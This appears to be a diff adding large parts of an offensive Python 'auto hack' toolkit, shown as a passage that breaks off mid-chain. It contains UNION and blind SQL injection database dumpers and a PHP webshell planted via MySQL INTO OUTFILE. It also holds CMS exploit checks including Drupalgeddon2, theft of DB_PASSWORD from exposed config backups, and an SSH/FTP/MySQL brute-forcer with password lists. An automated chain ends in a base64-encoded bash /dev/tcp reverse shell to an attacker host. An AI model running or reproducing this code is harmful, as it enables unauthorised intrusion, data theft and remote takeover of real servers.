+        self.data = {}
+
+    def dump_all(self):
+        header("SQL AUTO EXPLOIT — FULL DATABASE DUMP")
+        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
+        if self.scanner.bypass.connect_error:
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return None
+
+        print(f"\n  {BOLD}{C}PHASE 1: INJECTION DETECTION{N}")
+        inj = self.scanner._find_injection()
+        if not inj:
+            print(f"  {R}✘{N} No injection point found.\n"); return None
+        print(f"  {G}✔{N} Injectable: {Y}{inj}{N}")
+        self.scanner.injectable_param = inj
+
+        print(f"\n  {BOLD}{C}PHASE 2: COLUMN COUNT{N}")
+        cols = self.scanner._find_column_count()
+        print(f"  {G}✔{N} Columns: {Y}{cols}{N}")
+
+        print(f"\n  {BOLD}{C}PHASE 3: DATABASE INFO{N}")
+        for name, expr in [("Version", "@@version"), ("Database", "database()"), ("User", "user()")]:
+            data = self.scanner._extract_data(expr)
+            if data:
+                val = ' '.join(data[:3])
+                self.data[name] = val
+                print(f"  {G}•{N} {name}: {Y}{val}{N}")
+
+        print(f"\n  {BOLD}{C}PHASE 4: TABLE ENUMERATION{N}")
+        tbl_expr = "group_concat(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()"
+        data = self.scanner._extract_data(tbl_expr)
+        tables = []
+        if data:
+            raw = " ".join(data)
+            tables = [t.strip() for t in raw.replace("|", " ").split() if t.strip() and len(t.strip()) < 50]
+            if tables:
+                print(f"  {G}✔{N} Tables ({len(tables)}): {Y}{', '.join(tables)}{N}")
+        self.data["tables"] = tables
+
+        print(f"\n  {BOLD}{C}PHASE 5: DATA DUMP{N}")
+        for table in tables[:10]:
+            col_expr = f"group_concat(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'"
+            col_data = self.scanner._extract_data(col_expr)
+            cols_list = []
+            if col_data:
+                raw = " ".join(col_data)
+                cols_list = [c.strip() for c in raw.replace("|", " ").split() if c.strip() and len(c.strip()) < 50]
+            if not cols_list:
+                continue
+            sel = ",".join(cols_list[:8])
+            row_expr = f"group_concat({sel} SEPARATOR '|') FROM {table}"
+            row_data = self.scanner._extract_data(row_expr)
+            if row_data:
+                raw = " ".join(row_data)
+                rows_raw = [r.strip() for r in raw.split("|") if r.strip()]
+                print(f"\n  {C}▶{N} {Y}{table}{N} ({len(cols_list)} cols, {len(rows_raw)} rows)")
+                print(f"      {D}Columns: {', '.join(cols_list[:8])}{N}")
+                for row in rows_raw[:15]:
+                    clean = re.sub(r'\s+', ' ', row).strip()[:120]
+                    if clean:
+                        print(f"      {G}→{N} {W}{clean}{N}")
+                self.data[table] = {"columns": cols_list, "rows": rows_raw[:15]}
+
+        outfile = f"sqli_dump_{urlparse(self.url).netloc}.txt"
+        with open(outfile, "w") as f:
+            for table, info in self.data.items():
+                f.write(f"[{table}]\n")
+                if isinstance(info, dict):
+                    f.write(f"  Columns: {', '.join(info.get('columns',[]))}\n")
+                    for r in info.get("rows",[]):
+                        f.write(f"  Data: {r}\n")
+                else:
+                    f.write(f"  {info}\n")
+        print(f"\n  {G}✔{N} Dump saved to {Y}{outfile}{N}")
+        print()
+        return self.data
+
+    def write_webshell(self, path=None):
+        """Write PHP webshell via MySQL INTO OUTFILE (bypasses HTTP upload limits)."""
+        shell_code = "<?php ob_clean();header('Content-Type: text/plain');echo shell_exec($_REQUEST['cmd']??'id');exit;?>"
+        paths = path or ["/var/www/html/", "/var/www/", "/var/www/public/", "/var/www/html/public/",
+                         "/usr/local/nginx/html/", "/usr/local/apache2/htdocs/", "/home/",
+                         "/tmp/", "/var/tmp/"]
+        if isinstance(paths, str): paths = [paths]
+        ext = self.scanner
+        col_count = ext._find_column_count() or 1
+        fn = f"nusa_{random.randint(10000,99999)}.php"
+        for p in paths:
+            escaped = p.replace("/", "\\\\/").replace("'", "\\\\'")
+            sql = f"UNION SELECT {col_count - 1},{col_count} FROM (SELECT 1)a JOIN (SELECT 2)b"
+            sql = f"' UNION SELECT '{shell_code}' INTO OUTFILE '{p}{fn}' -- -"
+            try:
+                u = ext._build(ext.injectable_param, sql)
+                r = ext.bypass.get(u, timeout=10)
+                if r.status_code == 200:
+                    vurl = self.url.split("?")[0].rsplit("/", 1)[0] + "/" + fn
+                    r2 = requests.get(vurl, timeout=6, verify=False)
+                    if r2.status_code == 200 and not r2.text.strip().startswith("<!DOCTYPE"):
+                        print(f"  {G}[✔]{N} WEBSHELL via MySQL OUTFILE: {Y}{vurl}{N}")
+                        return vurl
+            except: pass
+        print(f"  {Y}[−]{N} MySQL OUTFILE write failed (check MySQL user privileges)")
+        return None
+
+
+# ══════════════════════════════════════════════════════
+#  CMS EXPLOITER — WordPress / Joomla / Drupal
+# ══════════════════════════════════════════════════════
+#  BLIND SQLi EXPLOITER — Boolean + Time Based
+# ══════════════════════════════════════════════════════
+
+class BlindSQLiExploiter:
+    def __init__(self, url, param, method="GET", technique="auto", delay=2, bypass=None):
+        self.url = url
+        self.param = param
+        self.method = method.upper()
+        self.technique = technique
+        self.delay = delay
+        self.bypass = bypass or BypassEngine(url)
+        self.parsed = urlparse(url)
+        self.params = parse_qs(self.parsed.query) if parse_qs(self.parsed.query) else {}
+        self.data = {}
+        self.baseline_len = 0
+        self.baseline_text = ""
+        self.diff_true = 0
+        self.diff_false = 0
+        self.use_time = False
+
+    def _req(self, payload):
+        new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
+        u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+        try:
+            return self.bypass.get(u, timeout=15, allow_redirects=False)
+        except: return None
+
+    def _setup(self):
+        r = self._req(str(random.randint(0,9999)))
+        if not r: return False
+        self.baseline_len = len(r.text or "")
+
+        r_true = self._req(f"1' AND 1=1-- -") or self._req(f"1 AND 1=1")
+        if not r_true: return False
+        self.diff_true = abs(len(r_true.text or "") - self.baseline_len)
+
+        r_false = self._req(f"1' AND 1=2-- -") or self._req(f"1 AND 1=2")
+        if not r_false: return False
+        self.diff_false = abs(len(r_false.text or "") - self.baseline_len)
+
+        if abs(self.diff_true - self.diff_false) < 5 and self.diff_false < 50:
+            self.use_time = True
+            return True
+
+        return abs(self.diff_true - self.diff_false) > 3
+
+    def _true(self, condition):
+        if self.use_time or self.technique == "time":
+            self.use_time = True
+            payload = f"1' AND IF({condition},SLEEP({self.delay}),0)-- -"
+            try:
+                new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
+                u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+                start = time.time()
+                self.bypass.get(u, timeout=self.delay*3, allow_redirects=False)
+                return time.time() - start >= self.delay
+            except: return False
+        else:
+            payload = f"1' AND {condition}-- -"
+            r = self._req(payload)
+            if not r: return False
+            d = abs(len(r.text or "") - self.baseline_len)
+            return abs(d - self.diff_true) < abs(d - self.diff_false)
+
+    def _len(self, query):
+        for l in range(1, 256):
+            if self._true(f"LENGTH(({query}))={l}"):
+                return l
+        return 0
+
+    def _chr(self, query, pos):
+        lo, hi = 32, 126
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self._true(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
+                lo = mid + 1
+            else:
+                hi = mid
+        return chr(lo)
+
+    def _extract(self, query, max_len=100):
+        if not self._true(f"LENGTH(({query}))>0"):
+            return None
+        length = self._len(query)
+        if length == 0 or length > max_len: return None
+        res = ""
+        for pos in range(1, length + 1):
+            ch = self._chr(query, pos)
+            res += ch
+            if pos % 5 == 0:
+                print(f"      {D}[{pos}/{length}] {res}{' ' * 10}{N}", end="\r")
+        return res
+
+    def dump_all(self):
+        header("BLIND SQLi EXPLOITER — AUTO DATA EXTRACTION")
+        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
+        print(f"  {C}◉{N} Param: {Y}{self.param}{N} | Tech: {Y}{self.technique.upper()}{N}")
+        print(f"  {self.bypass.info()}{N}")
+        if self.bypass.connect_error:
+            print(f"\n  {R}✘{N} Unreachable.\n"); return None
+
+        print(f"\n  {BOLD}{C}CALIBRATE{N}")
+        if not self._setup():
+            print(f"  {R}✘{N} Calibration failed.\n"); return None
+        print(f"  {G}✔{N} {'Time-based' if self.use_time else 'Boolean-based'} injection detected!")
+
+        print(f"\n  {BOLD}{C}DATABASE INFO{N}")
+        for name, sql in [("Version","SELECT @@version"),("Database","SELECT database()"),("User","SELECT user()")]:
+            print(f"  {C}▶{N} {Y}{name}{N}...")
+            v = self._extract(sql)
+            if v: print(f"\n  {G}✔{N} {name}: {Y}{v}{N}"); self.data[name.lower()] = v
+
+        print(f"\n  {BOLD}{C}TABLES{N}")
+        tables = []
+        for i in range(15):
+            q = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {i}"
+            if not self._true(f"EXISTS({q})"): break
+            print(f"  {C}▶{N} Table #{i+1}...")
+            v = self._extract(q)
+            if v: tables.append(v); print(f"\n  {G}✔{N} {Y}{v}{N}")
+            else: break
+        self.data["tables"] = tables
+
+        print(f"\n  {BOLD}{C}DATA DUMP{N}")
+        for tbl in tables[:5]:
+            cols = []
+            for i in range(15):
+                q = f"SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' LIMIT 1 OFFSET {i}"
+                if not self._true(f"EXISTS({q})"): break
+                v = self._extract(q)
+                if v: cols.append(v)
+                else: break
+            if not cols: continue
+            print(f"\n  {C}▶{N} {Y}{tbl}{N} cols: {', '.join(cols[:6])}")
+            for ri in range(5):
+                q = f"SELECT {','.join(cols[:3])} FROM {tbl} LIMIT 1 OFFSET {ri}"
+                if not self._true(f"EXISTS({q})"): break
+                v = self._extract(q)
+                if v: print(f"      {G}→{N} {W}{v[:120]}{N}")
+
+        fn = f"blind_sqli_{urlparse(self.url).netloc}.txt"
+        with open(fn,"w") as f:
+            for k,v in self.data.items():
+                f.write(f"[{k}]\n{v}\n")
+        print(f"\n  {G}✔{N} Saved: {Y}{fn}{N}\n")
+        return self.data
+
+
+class CMSExploiter:
+    def __init__(self, url, bypass=None):
+        self.url = url.rstrip("/")
+        self.bypass = bypass or BypassEngine(url)
+        self.cms = None
+        self.vulns = []
+
+    def detect(self):
+        try:
+            r = self.bypass.get(self.url, timeout=10)
+            html = r.text.lower()
+            if "/wp-content/" in html or "/wp-includes/" in html or "wordpress" in html:
+                self.cms = "WordPress"
+            elif "/components/" in html and "/modules/" in html and "joomla" in html:
+                self.cms = "Joomla"
+            elif "drupal" in html or "/sites/default/" in html or "drupal.js" in html:
+                self.cms = "Drupal"
+            elif "magento" in html or "mage-cache" in html:
+                self.cms = "Magento"
+            return self.cms
+        except: return None
+
+    def wp_exploit(self):
+        exploits = []
+        print(f"\n  {BOLD}{C}WORDPRESS EXPLOIT{N}")
+
+        # Check wp-json
+        try:
+            r = self.bypass.get(f"{self.url}/wp-json/wp/v2/users", timeout=8)
+            if r.status_code == 200:
+                try:
+                    users = json.loads(r.text)
+                    if users:
+                        print(f"  {R}[!]{N} WP REST API exposed! Users:")
+                        for u in users[:5]:
+                            print(f"      {Y}{u.get('name','?')}{N} ({u.get('slug','?')})")
+                        exploits.append("REST API user enum")
+                except: pass
+        except: pass
+
+        # Check xmlrpc
+        try:
+            r = self.bypass.post(f"{self.url}/xmlrpc.php", data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
+                headers={"Content-Type": "text/xml"}, timeout=8)
+            if r.status_code == 200 and "methodName" in r.text:
+                print(f"  {Y}[!]{N} XML-RPC enabled — brute force vectors available")
+                exploits.append("XML-RPC enabled")
+        except: pass
+
+        # Check debug log
+        for debug in ["wp-content/debug.log", "wp-config.php.bak", "wp-config.php~", ".wp-config.php.swp"]:
+            try:
+                r = self.bypass.get(f"{self.url}/{debug}", timeout=8)
+                if r.status_code == 200 and len(r.text) > 100:
+                    print(f"  {R}[!]{N} Sensitive file exposed: {Y}{self.url}/{debug}{N}")
+                    if "DB_PASSWORD" in r.text:
+                        pwds = re.findall(r"define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", r.text)
+                        if pwds:
+                            print(f"  {R}{BOLD}DB_PASSWORD: {Y}{pwds[0]}{N}")
+                    exploits.append(f"Sensitive file: {debug}")
+            except: pass
+
+        # Auto upload webshell via theme editor if admin creds known
+        print(f"\n  {D}WordPress exploits checked. Use 'webshell' module to upload shell.{N}")
+
+        if not exploits:
+            print(f"  {G}✔{N} No obvious WordPress vulns (try deeper scan)")
+        return exploits
+
+    def joomla_exploit(self):
+        exploits = []
+        print(f"\n  {BOLD}{C}JOOMLA EXPLOIT{N}")
+        # Check Joomla version
+        try:
+            r = self.bypass.get(f"{self.url}/administrator/manifests/files/joomla.xml", timeout=8)
+            if r.status_code == 200:
+                vm = re.search(r'<version>([^<]+)', r.text)
+                if vm:
+                    print(f"  {C}▶{N} Joomla version: {Y}{vm.group(1)}{N}")
+                    exploits.append(f"Version: {vm.group(1)}")
+        except: pass
+
+        # Check com_user SQLi
+        try:
+            r = self.bypass.get(f"{self.url}/index.php?option=com_users&view=users", timeout=8)
+            if r.status_code == 200 and len(r.text) > 100:
+                print(f"  {Y}[!]{N} com_users view accessible")
+                exploits.append("com_users accessible")
+        except: pass
+        return exploits
+
+    def drupal_exploit(self):
+        exploits = []
+        print(f"\n  {BOLD}{C}DRUPAL EXPLOIT{N}")
+        # Check drupal version
+        try:
+            r = self.bypass.get(f"{self.url}/CHANGELOG.txt", timeout=8)
+            if r.status_code == 200:
+                vm = re.search(r'Drupal (\d+\.\d+)', r.text)
+                if vm:
+                    print(f"  {C}▶{N} Drupal version: {Y}{vm.group(1)}{N}")
+                    exploits.append(f"Version: {vm.group(1)}")
+        except: pass
+        # Drupalgeddon2 check
+        try:
+            r = self.bypass.post(f"{self.url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+                data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#markup]": "echo DRUPALTEST"}, timeout=8)
+            if r.status_code == 200 and "DRUPALTEST" in r.text:
+                print(f"  {R}[!]{N} {BOLD}Drupalgeddon2 (CVE-2018-7600) — RCE!{N}")
+                exploits.append("Drupalgeddon2 RCE")
+        except: pass
+        return exploits
+
+    def run(self):
+        header("CMS EXPLOITER — AUTO CMS HACK")
+        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
+        print(f"  {self.bypass.info()}{N}")
+        if self.bypass.connect_error:
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
+
+        cms = self.detect()
+        if not cms:
+            print(f"  {Y}⚠{N} CMS not detected (or custom)\n")
+            return []
+
+        print(f"  {G}✔{N} Detected: {Y}{cms}{N}\n")
+        if cms == "WordPress":
+            self.wp_exploit()
+        elif cms == "Joomla":
+            self.joomla_exploit()
+        elif cms == "Drupal":
+            self.drupal_exploit()
+        else:
+            print(f"  {Y}⚠{N} No specific exploits for {cms}")
+        print()
+        return self.vulns
+
+
+# ══════════════════════════════════════════════════════
+#  SERVICE BRUTEFORCER — Auto Brute SSH / FTP / MySQL
+# ══════════════════════════════════════════════════════
+
+class ServiceBruteforcer:
+    COMMON_USERS = ["root", "admin", "administrator", "user", "test", "guest", "oracle",
+                    "mysql", "postgres", "www-data", "nobody", "backup", "operator", "demo",
+                    "manager", "supervisor", "ftp", "mail", "info", "support", "sales", "admin1"]
+    COMMON_PASS = ["root", "admin", "password", "123456", "root123", "admin123", "P@ssw0rd",
+                   "password123", "toor", "qwerty", "letmein", "admin12345", "12345678",
+                   "passw0rd", "Passw0rd", "changeme", "secret", "1234", "abc123",
+                   "welcome", "test", "guest", "manager", "backup", "demo",
+                   "1q2w3e4r", "123qwe", "p@ssw0rd", "0", "1", "123",
+                   "password1", "root123!", "admin!", "mysql", "raspberry",
+                   "123456789", "qwerty123", "letmein123", "Passw0rd!", "admin2024",
+                   "root2024", "password!", "test123", "admin123!", "root1234"]
+
+    PORTS = {"ssh": 22, "ftp": 21, "mysql": 3306, "telnet": 23, "postgres": 5432, "mssql": 1433}
+
+    def __init__(self, target, port=None, service="ssh", wordlist_user=None, wordlist_pass=None, threads=5):
+        self.target = target
+        self.port = port
+        self.service = service.lower()
+        self.threads = min(threads, 30)
+        self.found = []
+        self.lock = threading.Lock()
+        self.q = Queue()
+        self.total = 0
+        self.done = 0
+        self.start_time = None
+        self._load_wordlists(wordlist_user, wordlist_pass)
+
+    def _load_wordlists(self, wl_u, wl_p):
+        self.users = list(self.COMMON_USERS)
+        self.passes = list(self.COMMON_PASS)
+        wd = os.path.join(os.path.dirname(__file__), "wordlists")
+        for path, attr in [(wl_u or os.path.join(wd, "usernames.txt"), "users"),
+                           (wl_p or os.path.join(wd, "passwords.txt"), "passes")]:
+            if os.path.exists(path):
+                with open(path, errors="ignore") as f:
+                    lines = [l.strip() for l in f if l.strip()]
+                    if lines:
+                        setattr(self, attr, lines)
+
+    def _try_ssh(self, user, pwd):
+        try:
+            import paramiko
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(self.target, port=self.port or 22, username=user, password=pwd, timeout=6)
+            _, stdout, _ = client.exec_command("id;hostname")
+            o = stdout.read().decode().strip()[:100]
+            client.close()
+            return f"SSH: {o}"
+        except ImportError: return "SKIP"
+        except paramiko.AuthenticationException: return None
+        except: return None
+
+    def _try_ftp(self, user, pwd):
+        try:
+            import ftplib
+            ftp = ftplib.FTP(timeout=6)
+            ftp.connect(self.target, self.port or 21)
+            ftp.login(user, pwd)
+            ftp.quit()
+            return f"FTP: {user}:{pwd}"
+        except ftplib.error_perm: return None
+        except ImportError: return "SKIP"
+        except: return None
+
+    def _try_mysql(self, user, pwd):
+        try:
+            import pymysql
+            conn = pymysql.connect(host=self.target, port=self.port or 3306, user=user, password=pwd, connect_timeout=6)
+            cur = conn.cursor()
+            cur.execute("SELECT CONCAT(version(),'|',user(),'|',database())")
+            r = cur.fetchone()[0]
+            conn.close()
+            return f"MYSQL: {r[:80]}"
+        except ImportError: return "SKIP"
+        except: return None
+
+    def _try_postgres(self, user, pwd):
+        try:
+            import psycopg2
+            conn = psycopg2.connect(host=self.target, port=self.port or 5432, user=user, password=pwd, connect_timeout=6)
+            cur = conn.cursor()
+            cur.execute("SELECT CONCAT(version()::text,'|',current_user)")
+            r = cur.fetchone()[0]
+            conn.close()
+            return f"POSTGRES: {r[:80]}"
+        except ImportError: return "SKIP"
+        except: return None
+
+    def _try_telnet(self, user, pwd):
+        try:
+            import telnetlib
+            tn = telnetlib.Telnet(self.target, self.port or 23, timeout=6)
+            tn.read_until(b"login: ", timeout=3)
+            tn.write(user.encode() + b"\n")
+            tn.read_until(b"Password: ", timeout=3)
+            tn.write(pwd.encode() + b"\n")
+            result = tn.read_some().decode(errors="ignore")
+            tn.close()
+            if "incorrect" not in result.lower() and "failed" not in result.lower():
+                return f"TELNET: {user}:{pwd}"
+        except ImportError: return "SKIP"
+        except: pass
+        return None
+
+    def _worker(self):
+        while True:
+            try: user, pwd = self.q.get_nowait()
+            except: break
+            t = getattr(self, f"_try_{self.service}", None)
+            if not t: break
+            result = t(user, pwd)
+            if result:
+                if result == "SKIP":
+                    with self.lock:
+                        if not hasattr(self, '_sw'):
+                            print(f"\n  {Y}⚠{N} Install library for {self.service} (pip install paramiko pymysql psycopg2)")
+                            self._sw = True
+                else:
+                    with self.lock:
+                        self.found.append({"u": user, "p": pwd, "r": result})
+                        print(f"\n  {G}{BOLD}[✔]{N} {Y}{user}{N}:{Y}{pwd}{N} {D}{result[:50]}{N}")
+            with self.lock:
+                self.done += 1
+                if self.done % max(1, self.total//50) == 0 or self.done == self.total:
+                    e = time.time() - self.start_time
+                    r = self.done/e if e>0 else 0
+                    print(f"  {D}[{self.done}/{self.total}] {self.done*100//self.total}% | {r:.0f}/s{N}", end="\r")
+            self.q.task_done()
+
+    def run(self):
+        header(f"SERVICE BRUTEFORCER — {self.service.upper()}")
+        p = self.port or self.PORTS.get(self.service, 22)
+        self.total = len(self.users) * len(self.passes)
+        print(f"  {C}◉{N} {self.target}:{p} | Users: {len(self.users)} | Pass: {len(self.passes)} | Combos: {self.total} | Threads: {self.threads}")
+        print(f"  {D}{'─'*50}{N}")
+        if not hasattr(self, f"_try_{self.service}"):
+            print(f"  {R}✘{N} Services: {', '.join(self.PORTS.keys())}\n"); return []
+        for u in self.users:
+            for p in self.passes:
+                self.q.put((u, p))
+        self.start_time = time.time()
+        for _ in range(min(self.threads, self.total)):
+            threading.Thread(target=self._worker, daemon=True).start()
+        self.q.join()
+        e = time.time() - self.start_time
+        print(f"\n  {D}{'─'*50}{N}")
+        if self.found:
+            print(f"  {R}{BOLD}⚠ {len(self.found)} found in {e:.1f}s!{N}")
+            for c in self.found: print(f"  {G}✔{N} {Y}{c['u']}{N}:{Y}{c['p']}{N}")
+        else: print(f"  {R}✘{N} None ({self.total} tries, {e:.1f}s)")
+        print(); return self.found
+
+
+# ══════════════════════════════════════════════════════
+#  SERVICE EXPLOITER — SSH / FTP / MySQL / SMTP
+# ══════════════════════════════════════════════════════
+
+class ServiceExploiter:
+    def __init__(self, target, username, password, port=None):
+        self.target = target
+        self.username = username
+        self.password = password
+        self.port = port
+        self.results = []
+
+    def ssh_login(self):
+        """Attempt SSH login using paramiko if available."""
+        try:
+            import paramiko
+        except ImportError:
+            return "paramiko not installed (pip install paramiko)"
+
+        port = self.port or 22
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(self.target, port=port, username=self.username, password=self.password, timeout=10)
+            stdin, stdout, stderr = client.exec_command("id; whoami; hostname")
+            output = stdout.read().decode() + stderr.read().decode()
+            client.close()
+            return f"SSH LOGIN SUCCESS!\n{output}"
+        except Exception as e:
+            return f"SSH failed: {e}"
+
+    def ftp_login(self):
+        """Attempt FTP login."""
+        port = self.port or 21
+        try:
+            import ftplib
+            ftp = ftplib.FTP()
+            ftp.connect(self.target, port, timeout=10)
+            ftp.login(self.username, self.password)
+            files = []
+            try:
+                ftp.dir(files.append)
+            except: pass
+            ftp.quit()
+            return f"FTP LOGIN SUCCESS!\nFiles: {len(files)} entries"
+        except Exception as e:
+            return f"FTP failed: {e}"
+
+    def mysql_login(self):
+        """Attempt MySQL login."""
+        port = self.port or 3306
+        try:
+            import pymysql
+            conn = pymysql.connect(host=self.target, port=port, user=self.username, password=self.password, connect_timeout=10)
+            cursor = conn.cursor()
+            cursor.execute("SELECT version(), user(), database()")
+            row = cursor.fetchone()
+            conn.close()
+            return f"MYSQL LOGIN SUCCESS!\nVersion: {row[0]}, User: {row[1]}"
+        except ImportError:
+            return "pymysql not installed (pip install pymysql)"
+        except Exception as e:
+            return f"MySQL failed: {e}"
+
+    def run(self, services=None):
+        if services is None:
+            services = ["ssh", "ftp", "mysql"]
+        header("SERVICE EXPLOITER — CREDENTIAL TESTING")
+        print(f"  {C}◉{N} Target: {Y}{self.target}{N}")
+        print(f"  {C}◉{N} Creds : {Y}{self.username}:{self.password}{N}\n")
+
+        for svc in services:
+            print(f"  {C}▶{N} Testing {Y}{svc.upper()}{N}...")
+            method = getattr(self, f"{svc}_login", None)
+            if method:
+                result = method()
+                if "SUCCESS" in str(result):
+                    print(f"  {G}[✔]{N} {result}")
+                    self.results.append({"service": svc, "status": "SUCCESS", "detail": str(result)[:200]})
+                else:
+                    print(f"  {R}[✘]{N} {result}")
+            else:
+                print(f"  {Y}[−]{N} No handler for {svc}")
+        print()
+        return self.results
+
+
+# ══════════════════════════════════════════════════════
+#  AUTO HACK — Full Auto Exploitation Chain
+# ══════════════════════════════════════════════════════
+
+class AutoHack:
+    def __init__(self, target, lhost=None, lport=4444, threads=20):
+        self.target = target
+        self.lhost = lhost
+        self.lport = lport
+        self.threads = threads
+        self.domain = None
+        self.base_url = None
+        self.bypass = None
+        self.results = {"exploits": [], "shells": [], "sqli_data": {}, "creds": [], "ports": []}
+        self.phases = []
+        self.t0 = time.time()
+
+        if self.target.startswith("http"):
+            self.base_url = self.target.rstrip("/")
+            self.domain = urlparse(self.target).netloc.split(":")[0]
+        else:
+            self.domain = self.target
+            self.base_url = f"http://{self.target}"
+
+    def _log(self, phase, status, msg):
+        self.phases.append({"phase": phase, "status": status, "msg": msg, "time": time.time()-self.t0})
+
+    def run(self):
+        header(f"AUTO HACK — FULL AUTO EXPLOITATION")
+        print(f"  {R}{BOLD}██ TARGET: {Y}{self.target}{N}")
+        print(f"  {R}{BOLD}██ LHOST:  {Y}{self.lhost or '(not set)'}{N}")
+        print(f"  {D}{'═'*55}{N}")
+
+        self.bypass = BypassEngine(self.base_url)
+        print(f"  {self.bypass.info()}")
+
+        # PHASE 1: QUICK PORT SCAN
+        print(f"\n  {R}{BOLD}◆ PHASE 1: PORT SCAN{N}")
+        try:
+            ps = QuickScanner(self.domain).run()
+            self.results["ports"] = ps
+            self._log("portscan", "ok", f"{len(ps)} ports")
+            port_services = {p: s for p, s, _ in ps}
+        except:
+            port_services = {}
+            self._log("portscan", "fail", "")
+
+        # PHASE 2: CMS EXPLOIT
+        print(f"\n  {R}{BOLD}◆ PHASE 2: CMS EXPLOIT{N}")
+        try:
+            CMSExploiter(self.base_url, self.bypass).run()
+            self._log("cms", "ok", "")
+        except: self._log("cms", "fail", "")
+
+        # PHASE 3: LFI
+        print(f"\n  {R}{BOLD}◆ PHASE 3: LFI{N}")
+        try:
+            if "=" in self.base_url:
+                parsed = urlparse(self.base_url)
+                params = list(parse_qs(parsed.query).keys())
+                if params:
+                    LFIExploiter(self.base_url, params[0], self.bypass).scan()
+                    self._log("lfi", "ok", f"param={params[0]}")
+        except: self._log("lfi", "fail", "")
+
+        # PHASE 4: SQLi (UNION + Blind)
+        print(f"\n  {R}{BOLD}◆ PHASE 4: SQL INJECTION{N}")
+        sqli_creds = []
+        if "=" in self.base_url:
+            param = list(parse_qs(urlparse(self.base_url).query).keys())[0] if parse_qs(urlparse(self.base_url).query).keys() else None
+            try:
+                print(f"  {C}▶{N} Trying UNION-based SQLi...")
+                sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
+                data = sqli.dump_all()
+                if data: self.results["sqli_data"] = data; self._log("sqli", "ok", "union")
+            except: self._log("sqli", "fail", "union")
+            if not self.results.get("sqli_data"):
+                try:
+                    print(f"  {C}▶{N} Trying Blind SQLi...")
+                    bsqli = BlindSQLiExploiter(self.base_url, param)
+                    bdata = bsqli.dump_all()
+                    if bdata: self.results["sqli_data"] = bdata; self._log("sqli", "ok", "blind")
+                except: self._log("sqli", "fail", "blind")
+        else:
+            self._log("sqli", "skip", "no params")
+
+        # Extract creds from SQLi data and try against services
+        sqli_creds = []
+        if self.results.get("sqli_data"):
+            for tbl, info in self.results["sqli_data"].items():
+                if isinstance(info, dict):
+                    for row in info.get("rows", []):
+                        parts = row.lower().split()
+                        for p in parts:
+                            if re.match(r'^[\w.+-]+@[\w-]+\.[\w]{2,}$', p):
+                                sqli_creds.append(("email", p))
+                elif isinstance(info, str):
+                    for m in re.finditer(r'(?:user|admin|root|mail)[:=]\s*(\S+)', info, re.I):
+                        sqli_creds.append((m.group(1)[:20], m.group(1)))
+            if sqli_creds and port_services:
+                print(f"\n  {C}▶{N} Trying SQLi creds against services...")
+                for svc in ["ssh", "mysql"]:
+                    if (svc == "ssh" and 22 in port_services) or (svc == "mysql" and 3306 in port_services):
+                        for lbl, cred in sqli_creds[:5]:
+                            try:
+                                if svc == "ssh":
+                                    import paramiko
+                                    c = paramiko.SSHClient()
+                                    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                                    c.connect(self.domain, username=lbl, password=cred, timeout=3)
+                                    c.close()
+                                    self.results["creds"].append((lbl, cred))
+                                    print(f"  {G}✔{N} SSH: {Y}{lbl}:{cred}{N}")
+                                elif svc == "mysql":
+                                    import pymysql
+                                    conn = pymysql.connect(host=self.domain, user=cred, password=cred, connect_timeout=3)
+                                    conn.close()
+                                    self.results["creds"].append((cred, cred))
+                                    print(f"  {G}✔{N} MySQL: {Y}{cred}:{cred}{N}")
+                            except: pass
+
+        # PHASE 5: WEBSHELL (HTTP upload + MySQL OUTFILE fallback)
+        print(f"\n  {R}{BOLD}◆ PHASE 5: WEBSHELL{N}")
+        shell_url = None
+        try:
+            ws = WebShell(self.base_url, self.bypass)
+            r = ws.run("php", "auto")
+            if r:
+                shell_url = r.get("url")
+                self.results["shells"].append(r)
+                self._log("webshell", "ok", f"HTTP: {shell_url}")
+        except: self._log("webshell", "fail", "http")
+
+        if not shell_url and self.results.get("sqli_data"):
+            print(f"  {C}▶{N} Trying MySQL INTO OUTFILE webshell...")
+            try:
+                sqli = SQLAutoExploit(self.base_url, "GET", None, self.bypass)
+                ws_url = sqli.write_webshell()
+                if ws_url: shell_url = ws_url; self.results["shells"].append({"url":ws_url,"type":"php","method":"mysql_outfile"})
+            except: self._log("webshell", "fail", "mysql_outfile")
+
+        # PHASE 6: REVERSE SHELL (via webshell)
+        if shell_url and self.lhost:
+            print(f"\n  {R}{BOLD}◆ PHASE 6: REVERSE SHELL{N}")
+            try:
+                rs = ReverseShell(self.lhost, self.lport)
+                rs.run("bash")
+                payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
+                b64 = base64.b64encode(payload.encode()).decode()
+                ws = WebShell(self.base_url)
+                out = ws.exec_cmd(shell_url, f"echo {b64} | base64 -d | bash")
+                self._log("revshell", "ok" if out else "sent", "")
+            except: self._log("revshell", "fail", "")
+
+        # PHASE 7: SERVICE BRUTE (SSH/FTP/MySQL)
+        print(f"\n  {R}{BOLD}◆ PHASE 7: SERVICE BRUTE{N}")
